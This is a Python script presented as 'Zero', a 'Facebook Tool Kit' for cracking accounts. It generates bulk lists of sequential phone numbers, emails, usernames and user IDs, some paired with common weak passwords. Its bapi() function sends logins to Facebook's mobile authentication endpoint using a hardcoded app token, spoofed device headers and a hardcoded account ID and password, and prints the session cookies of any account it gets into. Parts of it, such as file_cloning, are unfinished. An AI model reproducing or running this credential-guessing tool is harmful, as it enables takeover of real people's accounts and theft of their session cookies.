#!/bin/python3
#author:
#_________[ IMPORTING MODULES ]_________>>
import requests as rq
import json,random
from os import system as cmd
from os import listdir as lst
from time import sleep as slp 
from random import randint as rint 
from random import choice as rsrt
from concurrent.futures import ThreadPoolExecutor
#_________[ BASIC COLOURS ]_________>>
red = "\033[1;31m"
green = "\033[1;32m"
white = "\033[1;37m"
blue = "\033[1;35m"
#_________[ LIST / LOOP ]_________>>
numX = []
mailX = []
unamX = []
uidX = []
pwd_list = []
user_opt = []
#_________[ LOGO ]_________>>
def logo():
    cmd("clear")
    print(f"""{white}
__________                   
\____    /___________  ____   
  /     // __ \_  __ \/  _ \  [{green}+{white}] Tool Name : Zero
 /     /\  ___/|  | \(  <_> ) [{green}+{white}] Version : 0.0.1
/_______ \___  >__|   \____/  [{green}+{white}] Creater : 
        \/   \/       {green} Facebook Tool Kit{white}  {white}""")
    print(f"{white}------------------------------------------------")
    print(f"{green} No Technology thats connected to internet is{white}")
    print(f"{green}                  Unhackable{white}")
    print(f"{white}------------------------------------------------")
#_________[ RANDOM NUMBER ]_________>>
def random_number():
    logo()
    print(" Input Any Phone Number With Country Code ")
    print(f" EX {green}(PAK){white}: 923445440123 ")
    print(f" EX {green}(IND){white}: 913445440123 ")
    print(f"{white}------------------------------------------------")
    number = input(f"[{green}+{white}] Input Number Without(+) : ")
    try:
        number = int(number)
    except ValueError:
        print(f"{red} Wrong Input Try Again {white}")
        slp(2)
        random_dump()
    try:
        limit = int(input("[+] Input limit dump : "))
    except ValueError:
        limit = 5000
    codeX_length = len(str(number))
    for i in range(limit):
        number = int(number)+i
        codeX = str(number)[((int(codeX_length))-7):]
        numX.append(str(number)+"|"+str(codeX))
    filepath = input(f"\n[{green}+{white}] Dumped File Save As : ")
    try:
        file = open(filepath,"w")
    except PermissionError:
        exit(f"{red} Allow Permission ")
    for ids in numX:
        file.write(ids+"\n")
    print(f"{white}------------------------------------------------")
    print(f"[{green}+{white}] Your File Save As : {green}{filepath}")
    print(f"[{green}+{white}] Dump Limit : {green}{str(limit)}")
    print(f"{white}------------------------------------------------")
    input("Press Enter For Back")
    random_dump()
#_________[ RANDOM EMAIL ]_________>>
def random_email():
    logo()
    print(" Input Any Name For Email Dump ")
    print(f" EX {green}(1){white}: Bilal Haider ID ")
    print(f" EX {green}(2){white}: Faraz Ali ID ")
    print(f"{white}------------------------------------------------")
    name = input(f"[{green}+{white}] Input Random Name : ")
    username = (name.replace(" ","")).lower()
    try:
        limit = int(input(f"[{green}+{white}] Input limit dump : "))
    except ValueError:
        limit = 5000
    domain = input(f"[{green}+{white}] Input Mail Domain : ")
    for i in range(limit):
        mail = username+str(i)+domain
        mailX.append(mail+"|"+name)
    filepath = input(f"\n[{green}+{white}] Dumped File Save As : ")
    try:
        file = open(filepath,"w")
    except PermissionError:
        exit(f"{red} Allow Permission ")
    for ids in mailX:
        file.write(ids+"\n")
    print(f"{white}------------------------------------------------")
    print(f"[{green}+{white}] Your File Save As : {green}{filepath}")
    print(f"[{green}+{white}] Dump Limit : {green}{str(limit)}")
    print(f"{white}------------------------------------------------")
    input("Press Enter For Back")
    random_dump()
#___________[ RANDOM USERNAME ]________>>
def random_username():
    logo()
    print(" Input Any Name For UserName Dump ")
    print(f" EX {green}(1){white}: Bilal Haider ID ")
    print(f" EX {green}(2){white}: Faraz Ali ID ")
    print(f"{white}------------------------------------------------")
    name = input(f"[{green}+{white}] Input Random Name : ")
    username = (name.replace(" ",".")).lower()
    try:
        limit = int(input(f"[{green}+{white}] Input limit dump : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        unamX.append((username+"."+str(i))+"|"+name)
    filepath = input(f"\n[{green}+{white}] Dumped File Save As : ")
    try:
        file = open(filepath,"w")
    except PermissionError:
        exit(f"{red} Allow Permission ")
    for ids in unamX:
        file.write(ids+"\n")
    print(f"{white}------------------------------------------------")
    print(f"[{green}+{white}] Your File Save As : {green}{filepath}")
    print(f"[{green}+{white}] Dump Limit : {green}{str(limit)}")
    print(f"{white}------------------------------------------------")
    input("Press Enter For Back")
    random_dump()
#___________[ RANDOM UID ]________>>
def random_UID():
    logo()
    print(" Input Any UID For User ID Dump ")
    print(f" EX {green}(1){white}: 100091*******")
    print(f" EX {green}(2){white}: 100000*******")
    print(f"{white}------------------------------------------------")
    uid = input(f"[{green}+{white}] Input Random UID : ")
    try:
        uid = int(uid)
    except ValueError:
        uid = rint(100000000000000,1000990000000000)
    try:
        limit = int(input(f"[{green}+{white}] Input limit dump : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        uid = uid+(i+1)
        pwduid = rsrt(["786786",
                       "123456",
                       "123456789",
                       "102030",
                       "112233",
                       "qwerty",
                       "000786"])
        uidX.append(str(uid)+"|"+pwduid)
    filepath = input(f"\n[{green}+{white}] Dumped File Save As : ")
    try:
        file = open(filepath,"w")
    except PermissionError:
        exit(f"{red} Allow Permission ")
    for ids in uidX:
        file.write(ids+"\n")
    print(f"{white}------------------------------------------------")
    print(f"[{green}+{white}] Your File Save As : {green}{filepath}")
    print(f"[{green}+{white}] Dump Limit : {green}{str(limit)}")
    print(f"{white}------------------------------------------------")
    input("Press Enter For Back")
    random_dump()
#_________[ FILE CLONING ]_________>>
def file_cloning():
    logo()
    files = lst("dump/")
    print("Files in Dump Folder : ")
    if len(files) > 0:
        for file in files:
            print(f"    [{green}+{white}] dump/{file}")
    filepath = input(f"[{green}+{white}] Input File For Crack : ")
    try:
        file_data = open(filepath,"r").read()
    except FileNotFoundError:
        exit(f"{red} File Not Found")
    uids = file_data.splitlines()
    total = len(uids)
#_________[ PASSWORD LIST ]_________>>
def password():
    logo()
    try:
        limit = int(input(f"[{green}+{white}] Input Password Limit For Crack [3]: "))
        if limit > 12:
            limit = 3
    except ValueError:
        limit = 3
    for i in range(limit):
        pwd = input(f"[{green}+{white}] Input Password {green}{str(i+1)}{white} : ")
        if pwd not in pwd_list:
            pwd_list.append(pwd)
    print(pwd_list)
#_________[ USER INPUT OPTION ]_________>>
def print_X():
    logo()
    print_cookie = input(f"[{green}+{white}] Do You Want To Print Cookie [n] (y/n) : ")
    print_cp = input(f"[{green}+{white}] Do You Want To Print CP Accounts [n] (y/n) : ")
    print_apk = input(f"[{green}+{white}] Do You Want To Print Ids APK [n] (y/n) : ")
    use_proxy = input(f"[{green}+{white}] Do You Want To Use Proxy [n] (y/n) : ")
    if (print_cookie).lower() == "y":user_opt.append("print_cookie")
    if (print_cp).lower() == "y":user_opt.append("print_cp")
    if (print_apk).lower() == "y":user_opt.append("print_apk")
    if (use_proxy).lower() == "y":user_opt.append("proxy")
#_________[ BAPI CRACKING DEF ]_________>>
def bapi():
    username = "100092511296862"
    password = "pabbikpk"
    url = "https://b-api.facebook.com/method/auth.login"
    sim = random.choice(['2e4', '4e4'])
    headers = {
        'accept-encoding': 'gzip, deflate', 
        'Accept': '*/*', 
        'x-fb-connection-bandwidth': random.choice(['2e7', '3e7']),
        'x-fb-sim-hni': sim,
        'x-fb-net-hni': sim,
        'Connection': 'keep-alive', 
        'content-type': 'application/x-www-form-urlencoded', 
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
        'x-fb-friendly-name': 'authenticate', 
        'x-fb-http-engine': 'Liger',
        'method' : 'auth.login',
        'user-agent': '[FBAN/FB4A;FBAV/55.0.0.967;FBBV/2353041;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'}
    parameters = {
        'email':username,
        'password':password,
        'cpl':'true',
        'credentials_type':'password',
        'error_detail_type':'button_with_disabled',
        'source':'login',
        'format':'json',
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'generate_machine_id':'1'
        }
    data = rq.post(url,headers=headers,data=parameters).text
    print(data)
    json_data = json.loads(data)
    if 'session_key' in str(data):
        uid = json_data['uid']
        print(f"{green}[OK] {uid} - {password} {white}")
        cookie = ";".join(i["name"]+"="+i["value"] for i in json_data['session_cookies'])
        print(cookie)
#_________[ MAIN MENU ]_________>>
def random_dump():
    logo()
    print(f"[{green}01{white}] Random Number Dump")
    print(f"[{green}02{white}] Random Email Dump")
    print(f"[{green}03{white}] Random UserName Dump")
    print(f"[{green}04{white}] Random Random UID Dump")
    print(f"[{green}00{white}] Exit ")
    print(f"{white}------------------------------------------------")
    mch = input(f"[{green}>>{white}] Choose an option : ")
    if mch in ["1","01"]:random_number()
    elif mch in ["2","02"]:random_email()
    elif mch in ["3","03"]:random_username()
    elif mch in ["4","04"]:random_UID()
    elif mch in {"0","00"}:exit()
    else:
        slp(1)
        random_dump()
def main():
    print_X()
if __name__=="__main__":
    bapi()